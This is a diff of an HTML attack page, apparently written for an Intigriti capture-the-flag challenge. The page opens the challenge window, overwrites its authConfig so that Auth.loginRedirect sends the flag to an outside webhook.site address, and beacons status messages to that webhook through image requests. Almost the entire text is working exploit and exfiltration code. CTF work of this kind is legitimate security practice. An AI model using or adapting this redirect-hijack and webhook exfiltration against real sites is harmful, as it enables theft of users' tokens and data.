@@ -1,18 +1,33 @@
-
+<!DOCTYPE html>
+<html>
+<body>
 <script>
 var webhook = 'https://webhook.site/961144e5-fb8e-4d33-abbc-dff6bd3aec13';
-var w = window.open('https://challenge-0326.intigriti.io/challenge.html?q=test');
-setTimeout(function() {
-  try {
-    w.authConfig = { dataset: { next: webhook, append: 'true' } };
-    w.Auth.loginRedirect({});
-  } catch(e) {
-    setTimeout(function() {
-      try {
-        w.authConfig = { dataset: { next: webhook, append: 'true' } };
-        w.Auth.loginRedirect({});
-      } catch(e2) {}
-    }, 3000);
-  }
-}, 3000);
+
+function log(msg) {
+  new Image().src = webhook + '/log?msg=' + encodeURIComponent(msg);
+}
+
+log('page-loaded');
+
+try {
+  var w = window.open('https://challenge-0326.intigriti.io/challenge.html?q=test');
+  log('window-opened:' + (w ? 'success' : 'null'));
+  
+  setTimeout(function() {
+    try {
+      log('trying-access');
+      log('Auth:' + typeof w.Auth);
+      w.authConfig = { dataset: { next: webhook + '/flag', append: 'true' } };
+      w.Auth.loginRedirect({});
+      log('called-redirect');
+    } catch(e) {
+      log('error1:' + e.message);
+    }
+  }, 4000);
+} catch(e) {
+  log('open-error:' + e.message);
+}
 </script>
+</body>
+</html>
